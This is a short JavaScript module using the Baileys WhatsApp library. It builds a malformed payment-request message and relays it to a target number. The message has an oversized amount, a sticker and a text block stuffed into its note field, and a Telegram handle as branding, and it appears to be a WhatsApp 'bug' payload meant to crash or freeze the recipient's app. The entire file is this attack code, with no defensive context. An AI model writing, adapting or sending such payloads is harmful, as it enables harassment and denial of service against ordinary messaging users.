const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

async function lottiesPay(sock, target) {
  const x = {
    requestPaymentMessage: {
      currencyCodeIso4217: 'IDR',
      amount1000: '999999999',
      noteMessage: {
        stickerMessage: {
          url: 'https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true',
          fileSha256: 'SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=',
          fileEncSha256: 'l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=',
          mediaKey: 'UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=',
          mimetype: 'image/webp',
          directPath: '/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c',
          fileLength: '10610',
          mediaKeyTimestamp: '1775044724',
          stickerSentTs: '1775044724091'
        },
        extendedTextMessage: { text: ' !🚫¡ • ( gabby.t.me ).. 👀 ' },
        expiryTimestamp: Date.now() + 86400000,
        background: null
      }
    }
  };
  const msg = generateWAMessageFromContent(target, x, { userJid: target });
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target }
  });
}

module.exports = { lottiesPay };
